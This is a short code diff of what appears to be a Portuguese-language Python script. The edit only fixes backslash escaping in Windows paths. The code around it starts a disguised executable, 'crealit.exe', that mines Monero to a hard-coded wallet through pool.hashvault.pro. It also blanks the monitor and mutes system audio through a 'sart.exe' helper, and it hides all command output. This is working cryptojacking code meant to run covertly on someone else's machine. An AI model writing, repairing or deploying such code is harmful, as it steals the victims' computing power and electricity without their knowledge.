@@ -140,8 +140,8 @@ def baixar_arquivos():
             continue
 
 def desligar_monitor():
-    subprocess.Popen(f'cmd /c start "" "{destino}\sart.exe" monitor off', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    subprocess.Popen(f'cmd /c start "" "{destino}\sart.exe" mutesysvolume 1', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    subprocess.Popen(f'cmd /c start "" "{destino}\\sart.exe" monitor off', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    subprocess.Popen(f'cmd /c start "" "{destino}\\sart.exe" mutesysvolume 1', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 def get_computer_description():
     try:
@@ -155,7 +155,7 @@ def get_computer_description():
         return "sem_descricao"
 
 def ligar_crealit():
-    subprocess.Popen(f'cmd /c start "" "{destino}\crealit.exe"  --coin monero -o pool.hashvault.pro:80 -u 41g9z6vMVXh9egLLuyJGHyWzRjoagmDHSbgAk7WoxWpGPMSBL33ArZudfN8Fmq8QGPDLLtNdxEevNadr4wxtYhASEx7gpYx -p {get_computer_description()} --donate-level 1 ', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    subprocess.Popen(f'cmd /c start "" "{destino}\\crealit.exe"  --coin monero -o pool.hashvault.pro:80 -u 41g9z6vMVXh9egLLuyJGHyWzRjoagmDHSbgAk7WoxWpGPMSBL33ArZudfN8Fmq8QGPDLLtNdxEevNadr4wxtYhASEx7gpYx -p {get_computer_description()} --donate-level 1 ', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 def configurar_ip(rede_base="192.168.137.", gateway="192.168.137.1", mascara="255.255.255.0",
                   dns1="8.8.8.8", dns2="192.168.137.1", usar_powershell=True):
